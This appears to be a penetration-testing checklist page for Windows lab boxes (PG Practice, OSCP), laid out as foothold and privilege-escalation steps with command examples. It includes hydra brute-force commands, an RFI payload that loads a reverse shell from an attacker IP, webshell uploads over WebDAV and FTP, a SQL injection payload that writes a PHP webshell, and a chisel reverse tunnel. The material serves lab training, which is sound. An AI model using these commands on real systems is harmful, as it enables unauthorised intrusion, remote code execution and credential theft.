# Windows

{% hint style="info" %}
Based on the following PG Practice and PEN-200 boxes: Algernon, AuthBy, Billyboss, Craft, DVR4, Fish, Hepet, Internal, Jacko, Kevin, MedJed, Mice, Monster, Nickel, Slort, Squid, Shenzi, Hermes (OSCP A), Gust (OSCP B), Pascha (OSCP C).
{% endhint %}

## Foothold

<details>

<summary>Port Scan</summary>

The `nmap-scan` script can be found [here](https://github.com/CSpanias/ctf-scripts/tree/main?tab=readme-ov-file#nmap-scansh).

```bash
sudo nmap-scan <target-IP>
```

</details>

<details>

<summary>HTTP(S)</summary>

* [ ] [Dirbust](../../web/dirbusting.md) HTTP(S) ports with a [directory list](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/raft-large-directories.txt) (plus server-specific extensions) and a [file list](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/raft-large-files.txt)&#x20;

{% code overflow="wrap" %}
```bash
# Dirbust with a directory list
ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -ic -ac -c -u http://access/FUZZ -e .aspx,.php,
​
​# Dirbust with a file list
ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-large-files.txt -ic -ac -c -u http://access/FUZZ
```
{% endcode %}

* [ ] [File Uploads](https://x7331.gitbook.io/boxes/web/file-uploads)
* [ ] Default/Weak Creds

```bash
uv run creds search <appName>
```

* [ ] BFA

{% code overflow="wrap" %}
```bash
# POST request
hydra -L /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt -P /usr/share/wordlists/rockyou.txt 'http-post-form://target:8081/login.aspx:username=^USER^&password=^PASS^:F=403'

# POST request (base64-encoded credentials)
hydra -L /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt -P /usr/share/wordlists/rockyou.txt 'http-post-form://target:8081/login.aspx:username=^USER64^&password=^PASS64^:F=403'
```
{% endcode %}

* [ ] Application-specific PoCs (RCE, LFI, RFI)

{% code overflow="wrap" %}
```bash
# CLI tool
searchsploit <appName> <version>

# Google dork
site:github.com <appName> exploit poc

# RFI revshell
curl --path-as-is -s "http://10.10.10.10:4443/site/index.php?page=http://192.168.45.241:443/revshell_ivan.php" --proxy 127.0.0.1:8080
```
{% endcode %}

* [ ] [WebDAV](https://x7331.gitbook.io/boxes/web/webdav)

{% code overflow="wrap" %}
```bash
# Connect to WebDAV
cadaver http://x7331
Authentication required for hutch on server 'x7331':
Username: x7331
Password:
# Upload a webshell
dav:/> put /usr/share/webshells/aspx/cmdasp.aspx cmdasp.aspx

# Upload a webshell directly
curl -T '/home/kali/shell.aspx' 'http://192.168.64.122/' -u x7331:Pass123!
```
{% endcode %}

* [ ] [Custom wordlists](https://x7331.gitbook.io/boxes/tools/wordlists)

```bash
# Create a userlist based on the site users
username-anarchy -i site_users > anarchy_output

# Create a passlist based on the site content
cewl --write cewl_output http://192.168.202.21/
```

* [ ] [SQLi](https://x7331.gitbook.io/boxes/web/injections/sqli) (`sqlmap` is allowed for enumeration but not for exploitation)

{% code overflow="wrap" %}
```bash
# Enumeration
sqlmap -r login.req --batch

# Webshell
a' UNION SELECT "<?php echo shell_exec($_GET['c']); ?>" INTO OUTFILE 'C:/xampp/htdocs/webshell.php'--

# RCE
$ curl -s --path-as-is "http://192.168.180.127:45332/webshell.php?c=whoami"
```
{% endcode %}

</details>

<details>

<summary><a href="../../services/shares/smb-139-445.md#usage">SMB</a></summary>

* [ ] Known vulnerabilities

```bash
sudo nmap -script=smb-vuln\* -p445 10.10.10.10
```

* [ ] List and enumerate shares

{% code overflow="wrap" %}
```bash
# List shares and permissions
uv run nxc smb DC01 -u celia.almeda -p 7k8XHk3dMtmpnC7 --shares

# Download the target share
nxc smb MS02 -u x7331 -p Pass123! -M spider_plus -o DOWNLOAD_FLAG=True OUTPUT_FOLDER=./ MAX_FILE_SIZE=99999999
```
{% endcode %}

* [ ] `WRITE` access ([steal hashes](https://x7331.gitbook.io/boxes/services/tcp/shares/139-445-smb#hashes))

</details>

<details>

<summary><a href="https://x7331.gitbook.io/boxes/services/tcp/shares/21-ftp">FTP</a></summary>

* [ ] Anonymous login

{% code overflow="wrap" %}
```bash
# Anonymous login
ftp anonymous@target
ftp ftp@target
```
{% endcode %}

* [ ] BFA

```bash
hydra -l <user> -P <passlist> ftp://<target>
```

* [ ] Enumerate directories

```bash
# Download dir
wget -r ftp://ftp@target_directory
```

* [ ] Upload files

```bash
ftp> put revshell_ivan.php
```

</details>

<details>

<summary><a href="https://x7331.gitbook.io/boxes/services/tcp/mail/25-587-smtp">SMTP</a>, <a href="https://x7331.gitbook.io/boxes/services/tcp/mail/110-995-pop3">POP3</a></summary>

* [ ] Username enumeration (SMTP)

```bash
smtp-user-enum -M VRFY -U anarchy_output -t 10.10.10.10
```

* [ ] Inbox enumeration (POP3)

```bash
$ telnet 10.10.10.10 110
USER x7331
+OK x7331 is known here.
PASS Pass123!
+OK Welcome! 4 messages (4744 bytes)
LIST
+OK 4 messages, 4744 bytes
1 1342
2 963
3 1347
4 1092
RETR 1
```

* [ ] Phising attachments ([library-ms](https://x7331.gitbook.io/boxes/social-engineering/phising#attachment), [libre-office](https://x7331.gitbook.io/boxes/web/file-uploads/file-types/libreoffice), [pdf](https://x7331.gitbook.io/boxes/web/file-uploads/file-types/pdf))

</details>

<details>

<summary><a href="https://x7331.gitbook.io/boxes/services/tcp">​Unique Ports</a></summary>



</details>

## Privilege Escalation

<details>

<summary>User Context</summary>

* [ ] [Privileges](https://x7331.gitbook.io/boxes/tl-dr/infra/os/windows/privilege-escalation/privileges) (if GUI access check for [token elevation](../../))

```powershell
whoami /priv
```

* [ ] [PS History](https://x7331.gitbook.io/boxes/tl-dr/infra/os/windows/host-recon#files)

{% code overflow="wrap" %}
```powershell
# History files of all host's users (assuming default path)
foreach($user in ((ls C:\users).fullname)){cat "$user\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt" -ErrorAction SilentlyContinue}
```
{% endcode %}

* [ ] [Local/Network Service to `SYSTEM`](https://x7331.gitbook.io/boxes/tl-dr/infra/os/windows/privilege-escalation/local-network-service)

</details>

<details>

<summary>Host Enumeration</summary>

* [ ] [WinPEAS](https://x7331.gitbook.io/boxes/tl-dr/infra/infra-tools/pe-scripts#windows)
* [ ] Kernel

```powershell
systeminfo
```

* [ ] [Local Services](https://x7331.gitbook.io/boxes/tl-dr/infra/os/windows/host-recon#system)

```bash
# Start the chisel server on the attacking host
./chisel server -p 8000 --reverse

# Connect from the target host
.\chisel.exe client 192.168.45.157:8000 R:6033:127.0.0.1:3306

# Enumerate the forwarded port on the attacking host
mysql -h 127.0.0.1 -P 6033 -u root
```

* [ ] [Running services](https://x7331.gitbook.io/boxes/tl-dr/infra/os/windows/privilege-escalation/services) (PowerUp)

</details>

<details>

<summary><a href="../../services/shares/smb-139-445.md#usage">SMB</a></summary>

* [ ] List and enumerate shares

{% code overflow="wrap" %}
```bash
# List shares and permissions
uv run nxc smb DC01 -u celia.almeda -p 7k8XHk3dMtmpnC7 --shares

# Download the target share
nxc smb MS02 -u x7331 -p Pass123! -M spider_plus -o DOWNLOAD_FLAG=True OUTPUT_FOLDER=./ MAX_FILE_SIZE=99999999
```
{% endcode %}

* [ ] `WRITE` access ([steal hashes](https://x7331.gitbook.io/boxes/services/tcp/shares/139-445-smb#hashes))

</details>

<details>

<summary><a href="https://x7331.gitbook.io/boxes/services/tcp/dbms/sql/1433-mssql">MSSQL</a></summary>

* [ ] Enumerate tables
* [ ] Links
* [ ] Users
* [ ] xp\_cmdshell
  * [ ] Host enumeration

</details>
